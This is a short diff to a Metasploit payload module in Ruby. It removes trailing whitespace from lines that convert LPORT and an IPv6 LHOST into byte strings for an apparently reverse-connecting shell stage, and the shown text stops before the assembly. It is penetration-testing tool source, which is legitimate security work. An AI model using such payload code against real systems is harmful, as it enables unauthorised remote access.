@@ -32,8 +32,8 @@ module MetasploitModule
   end
 
   def convert_input(value, padding, reverse=false)
-      # converts value to comma separated string of 
-      # zero-padded bytes to be used in the db instruction 
+      # converts value to comma separated string of
+      # zero-padded bytes to be used in the db instruction
       arr = value.to_s(16).rjust(padding, "0").scan(/../)
 
       if reverse
@@ -45,7 +45,7 @@ module MetasploitModule
 
   def generate_stage
       # 22 -> "0x00,0x16"
-      # 4444 -> "0x11,0x5c" 
+      # 4444 -> "0x11,0x5c"
       tcp_port = convert_input(datastore['LPORT'], 4)
 
       # 0 -> "0x00,0x00,0x00,0x00"
@@ -53,7 +53,7 @@ module MetasploitModule
 
       # ::1 -> "0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01"
       # dead:beef:2::1009 -> "0xde,0xad,0xbe,0xef,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x09"
-      ipv6_addr = convert_input(IPAddr.new(datastore['LHOST'], Socket::AF_INET6).to_i, 32) 
+      ipv6_addr = convert_input(IPAddr.new(datastore['LHOST'], Socket::AF_INET6).to_i, 32)
 
       payload = <<-EOS
         socket_call:
